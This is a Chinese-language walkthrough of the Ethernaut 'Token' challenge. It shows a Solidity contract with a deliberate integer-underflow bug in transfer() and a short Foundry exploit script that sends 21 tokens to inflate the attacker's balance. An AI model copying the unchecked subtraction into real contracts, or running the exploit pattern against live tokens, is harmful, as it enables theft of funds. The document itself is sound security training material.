# Level 5 - Token

## 題目
[Token](https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407)

### 通關條件
你一開始會被給 20 個代幣。如果你找到方法增加你手中代幣的數量，你就可以通過這一關，當然代幣數量越多越好。
### 提示
- 什麽是 odometer?
### 合約內容
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```
## 解題
odometer 是指汽車的里程表，達到最大值後再+1便會歸零，這就是常見的 overflow 的問題。  
這題要考的就是 overflow， overflow 簡單來說就是數字的儲存終有極限，當超過儲存極限的時候，沒有相對應的措施；就會導致程式出錯。  
所以了解每個變數型態可以表示的範圍是很重要的！！！  


---
這題的目標是增加自己的代幣（`balances[msg.sender]`）
從合約中可以找到變更自己代幣量的只有 12 行的 `transfer(address _to, uint256 _value)`，它會將你手中的代幣減少，並且增加在你要轉去的地址中
```solidity=12
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```
我們只要透過這個 function，透過我們輸入的參數造成 overflow，就可以讓手中的代幣不減反增。題目一開始說我們手中的代幣有 20 個，儲存代幣的變數 `balances` 的型態是 `uint256` 
```solidity=5
    mapping(address => uint256) balances;
```
`uint256` 的範圍是 $0$ 到 $2^{256}-1$，也就是說我們只要轉出 21 個代幣，就會讓我們的代幣持有量變成 $2^{256}-1$，達到代幣增加的效果。攻擊合約如下：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/05_Token.sol";

contract ExploitScript is Script {
    Token level05 = Token(your_challenge_address);

    function run() external {
        vm.startBroadcast();

        level05.transfer(your_challenge_address, 21);

        vm.stopBroadcast();
    }
}
```
Overflow 是寫程式時常會需要去考慮到的問題。雖然現在很多框架都會自動幫忙處理，但還是要了解這些觀念，避免程式發生預期外的錯誤，關於 overflow 也可以參考：
- [[中文] WTF Solidity 合约安全: S05. 整型溢出](https://github.com/AmazingAng/WTF-Solidity/tree/main/S05_Overflow)
- [[中文] 溢位攻擊 | 觀點解析](https://medium.com/@communitybca/%E6%BA%A2%E4%BD%8D%E6%94%BB%E6%93%8A-%E8%A7%80%E9%BB%9E%E8%A7%A3%E6%9E%90-b32544747646)
- [[EN] Integer overflow and underflow in solidity](https://metaschool.so/articles/integer-overflow-and-underflow-in-solidity/)